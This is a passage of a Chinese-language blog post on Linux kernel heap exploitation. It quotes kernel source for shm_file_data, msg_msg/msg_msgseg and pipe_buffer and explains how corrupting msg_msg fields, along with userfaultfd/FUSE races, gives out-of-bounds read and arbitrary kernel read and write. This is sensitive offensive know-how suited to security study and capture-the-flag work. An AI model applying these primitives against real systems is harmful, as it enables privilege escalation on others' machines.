<span class="type">int</span>, shmflg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line"><span class="type">long</span> err;</span><br><span class="line"></span><br><span class="line">err = do_shmat(shmid, shmaddr, shmflg, &amp;ret, SHMLBA);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">force_successful_syscall_return();</span><br><span class="line"><span class="keyword">return</span> (<span class="type">long</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在do_shmat中会分配一个shm_file_data结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    file-&gt;private_data = sfd;</span><br></pre></td></tr></table></figure><h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><p><code>shmdt</code> 系统调用用以断开与共享内存对象的连接，观察其源码，发现其会调用 <code>ksys_shmdt()</code> 函数，注意到如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYS_shmdt()</span><br><span class="line">    ksys_shmdt()</span><br><span class="line">        do_munmap()</span><br><span class="line">            remove_vma_list()</span><br><span class="line">                remove_vma()</span><br></pre></td></tr></table></figure><p>其中有着这样一条代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> vm_area_struct *<span class="title function_">remove_vma</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">next</span> =</span> vma-&gt;vm_next;</span><br><span class="line"></span><br><span class="line">    might_sleep();</span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;close)</span><br><span class="line">        vma-&gt;vm_ops-&gt;close(vma);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>在这里调用了该 vma 的 vm_ops 对应的 close 函数，我们将目光重新放回共享内存对应的 vma 的初始化的流程当中，在 shmat() 中注意到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!sfd) &#123;</span><br><span class="line">        fput(base);</span><br><span class="line">        <span class="keyword">goto</span> out_nattch;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file = alloc_file_clone(base, f_flags,</span><br><span class="line">              is_file_hugepages(base) ?</span><br><span class="line">                &amp;shm_file_operations_huge :</span><br><span class="line">                &amp;shm_file_operations);</span><br></pre></td></tr></table></figure><p>在这里调用了 <code>alloc_file_clone()</code> 函数，其会调用 <code>alloc_file()</code> 函数将第三个参数赋值给新的 file 结构体的 f_op 域，在这里是 <code>shm_file_operations</code> 或 <code>shm_file_operations_huge</code>，定义于 <code>/ipc/shm.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * shm_file_operations_huge is now identical to shm_file_operations,</span></span><br><span class="line"><span class="comment"> * but we keep it distinct for the sake of is_file_shm_hugepages().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations_huge</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这里对于关闭 shm 文件，对应的是 <code>shm_release</code> 函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">shm_release</span><span class="params">(<span class="keyword">struct</span> inode *ino, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span> =</span> shm_file_data(file);</span><br><span class="line"></span><br><span class="line">    put_ipc_ns(sfd-&gt;ns);</span><br><span class="line">    fput(sfd-&gt;file);</span><br><span class="line">    shm_file_data(file) = <span class="literal">NULL</span>;</span><br><span class="line">    kfree(sfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即当我们进行 shmdt 系统调用时便可以释放 <code>shm_file_data</code> 结构体</p><h2 id="msg"><a href="#msg" class="headerlink" title="msg"></a>msg</h2><p><strong>申请obj大小:64-4k</strong></p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:任意读|任意写|堆喷</strong></p><p>在 Linux kernel 中有着一组 system V 消息队列相关的系统调用：</p><ul><li>msgget：创建一个消息队列</li><li>msgsnd：向指定消息队列发送消息</li><li>msgrcv：从指定消息队列接接收消息</li></ul><p><strong>msgget</strong></p><p>其中msgget用于创建一个消息队列时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">msgget</span><span class="params">(<span class="type">key_t</span> key, <span class="type">int</span> msgflag)</span></span><br></pre></td></tr></table></figure><ul><li>key:值为函数ftok的返回值或<code>IPC_PRIVATE</code>，若为<code>IPC_PRIVATE</code>则直接创建新的消息队列</li><li>msgflag:<code>IPC_CREAT</code>:创建新的消息队列。 <code>IPC_EXCL</code>:与<code>IPC_CREAT</code>一同使用，表示如果要创建的消息队列已经存在，则返回错误。(<code>IPC_EXCL</code>没有什么实质性的意义，但是可以帮我们确定是新建了消息队列而不是返回已经存在的消息队列) <code>IPC_NOWAIT</code>:读写消息队列要求无法满足时，不阻塞。返回值： 调用成功返回队列标识符,否则返回-1. 其中该参数需要配合权限控制符，例如<code>0666|IPC_CREAT</code></li></ul><p>在内核空间中会创建一个 <code>msg_queue</code> 结构体,其表示一个消息队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line"><span class="type">time64_t</span> q_stime;<span class="comment">/* last msgsnd time */</span></span><br><span class="line"><span class="type">time64_t</span> q_rtime;<span class="comment">/* last msgrcv time */</span></span><br><span class="line"><span class="type">time64_t</span> q_ctime;<span class="comment">/* last change time */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_cbytes;<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qnum;<span class="comment">/* number of messages in queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qbytes;<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span><span class="comment">/* pid of last msgsnd */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span><span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p><strong>msgsnd</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">msgsnd</span><span class="params">(<span class="type">int</span> msqid, <span class="type">const</span> <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">int</span> msgflg)</span></span><br></pre></td></tr></table></figure><ul><li>msqid:队列标识符</li><li>msgp:指向发送的消息,消息的前八个字节必须是msgtyp(值可以自定义),后面跟真正的消息</li><li>msgsz:真正的消息长度</li><li>msgflg:标志位<ul><li>0:消息队列满时,msgsnd阻塞直到消息能够写入消息队列</li><li>IPC_NOWAIT:消息队列满时不等待立即返回</li><li>IPC_NOERROR:若发送的消息长度大于msgsz,则截断</li></ul></li></ul><p>msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，会建立<code>msg_msg</code>结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在内核当中这两个结构体形成一个如下结构的循环双向链表：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/wjzFeZiDUpxXVKJ.png" alt=""></p><p>若是消息队列中只有一个消息则是这样:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/sD9xtpaHrQ2uneZ.png" alt=""></p><p>虽然 <code>msg_queue</code> 的大小基本上是固定的，但是 <code>msg_msg</code> 作为承载消息的本体<strong>其大小是可以随着消息大小的改变而进行变动的</strong>，去除掉 msg_msg 结构体本身的 0x30 字节的部分（或许可以称之为 header）<strong>剩余的部分都用来存放用户数据</strong>，因此内核分配的 object 的大小是跟随着我们发送的 message 的大小进行变动的</p><p>而当我们单次发送<strong>大于【一个页面大小 - header size】</strong>大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体，其与 <code>msg_msg</code> 之间形成如下单向链表结构：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/5IcVxRaFQtg3HCW.png" alt=""></p><p>同样地，单个 <code>msg_msgseg</code> 的大小最大为一个页面大小，因此超出这个范围的消息内核会额外补充上更多的 <code>msg_msgseg</code> 结构体</p><p><strong>msgrcv</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp,<span class="type">int</span> msgflg)</span></span><br></pre></td></tr></table></figure><ul><li>msgqid:消息队列标识符</li><li>msgp:存放消息的结构体,消息类型msgtyp也会放到这里</li><li>msgsz:接收消息长度,不包含消息类型</li><li>msgtyp:<ul><li>0:接收第一个消息</li><li>>0:接收消息类型等于msgtyp的第一个函数</li><li>&lt;0:返回队列中消息类型值小于或等于 msgtyp 绝对值的消息，如果这种消息有若干个，则取类型值最小的消息</li></ul></li><li>msgflg:<ul><li>0：msgrcv() 调用阻塞直到接收消息成功为止</li><li>MSG_NOERROR：若返回的消息字节数比 nbytes 字节数多,则消息就会截短到 nbytes 字节，且不通知消息发送进程</li><li>MSG_COPY：读取但不释放，当我们在调用 msgrcv 接收消息时，相应的 msg_msg 链表便会被释放，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink,从而我们便可以<strong>多次重复地读取同一个</strong> <code>msg_msg</code> 链条中数据</li><li>IPC_NOWAIT：调用进程会立即返回，若没有收到消息则立即返回 -1</li></ul></li></ul><p><strong>MSG_COPY</strong></p><p><code>MSG_COPY</code>位为1的时候,在<code>find_msg</code>中会返回<code>msg_msg</code>双向循环链表中，第<code>msgtyp</code>个<code>msg_msg</code>，也就是返回第<code>msgtyp</code>条消息，而不是根据<code>msgtyp</code>去和<code>msg-&gt;m_type</code>进行匹配</p><p>此外必须同时搭配<code>IPC_NOWAIT</code>标志</p><p>对于 <code>MSG_COPY</code> 而言，数据的拷贝使用的是 <code>copy_msg()</code> 函数，其会比对<strong>源消息的 m_ts 是否大于存储拷贝的消息的 m_ts ，若大于则拷贝失败</strong>，而后者则为我们传入 <code>msgrcv()</code> 的 <code>msgsz</code>，因此若我们仅读取单条消息则需要保证<strong>后者大于相等前者</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">copy_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *src, <span class="keyword">struct</span> msg_msg *dst)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">dst_pseg</span>, *<span class="title">src_pseg</span>;</span></span><br><span class="line"><span class="type">size_t</span> len = src-&gt;m_ts;</span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)<span class="comment">// 有个 size 检查</span></span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_MSG);</span><br><span class="line"><span class="built_in">memcpy</span>(dst + <span class="number">1</span>, src + <span class="number">1</span>, alen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;</span><br><span class="line">     src_pseg != <span class="literal">NULL</span>;<span class="comment">//以源 msg 链表尾为终止</span></span><br><span class="line">     dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;</span><br><span class="line"></span><br><span class="line">len -= alen;</span><br><span class="line">alen = min(len, DATALEN_SEG);</span><br><span class="line"><span class="built_in">memcpy</span>(dst_pseg + <span class="number">1</span>, src_pseg + <span class="number">1</span>, alen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dst-&gt;m_type = src-&gt;m_type;</span><br><span class="line">dst-&gt;m_ts = src-&gt;m_ts;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><strong>内存越界读</strong></p><p>在拷贝数据时对长度的判断主要依靠的是 <code>msg_msg-&gt;m_ts</code>，我们不难想到的是：若是我们能够控制一个 msg_msg 的 header，将其 m_sz 成员改为一个较大的数，我们就能够<strong>越界读取出最多将近一张内存页大小的数据</strong></p><p><strong>任意地址读</strong></p><p>对于大于一张内存页的数据而言内核会在 msg_msg 的基础上再补充加上 msg_msgseg 结构体，形成一个单向链表，我们不难想到的是：若是我们能够同时劫持 <code>msg_msg-&gt;m_ts</code> 与 <code>msg_msg-&gt;next</code>，我们<strong>便能够完成内核空间中的任意地址读</strong></p><p>但这个方法有一个缺陷，无论是 <code>MSG_COPY</code> 还是常规的接收消息，其拷贝消息的过程的判断主要依据还是单向链表的 next 指针，因此若我们需要完成对特定地址向后的一块区域的读取，<strong>我们需要保证该地址上的数据为 NULL</strong></p><p><strong>任意地址写</strong></p><p>当我们调用 msgsnd 系统调用时，其会调用 <code>load_msg()</code> 将用户空间数据拷贝到内核空间中，首先是调用 <code>alloc_msg()</code> 分配 <code>msg_msg</code> 单向链表，之后才是正式的拷贝过程<strong>，即空间的分配与数据的拷贝是分开进行的</strong></p><p>我们不难想到的是，<strong>在拷贝时利用 userfaultfd/FUSE 将拷贝停下来，在子进程中篡改 msg_msg 的 next 指针，在恢复拷贝之后便会向我们篡改后的目标地址上写入数据，从而实现任意地址写</strong></p><h2 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h2><h3 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h3><p><strong>申请obj大小:192</strong></p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:泄露直接映射区地址</strong></p><p>在内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> 来表示的，对应的就是一个 <code>pipe_inode_info</code> 结构体（<code>inode-&gt;i_pipe</code>），其中包含了一个管道的所有信息，当我们创建一个管道时，内核会创建一个 VFS inode 与一个 pipe_inode_info 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *@mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *@rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *@wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *@head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *@tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *@note_loss: The next read() should insert a data-lost message</span></span><br><span class="line"><span class="comment"> *@max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *@ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *@tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *@readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *@writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *@r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *@w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *@bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *@user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>pipe_inode_info-&gt;bufs</code> 为一个动态分配的结构体数组，因此我们可以利用他来泄露出内核的“堆”上地址</p><h3 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h3><p><strong>申请obj大小:任意(默认1k</strong>)</p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:泄露直接映射区地址</strong></p><p>当创建一个管道时,会自动创建<code>PIPE_DEF_BUFFERS(16)</code>个<code>pipe_buffer</code>,(只有在使用时才会按需分配初始化)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>offset是读取的偏移,len是可读的长度,写入的偏移是offset+len</p><p>一个管道的<code>pipe_buffer</code>数量是可以更改的</p><p>存在一个系统调用fcntl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 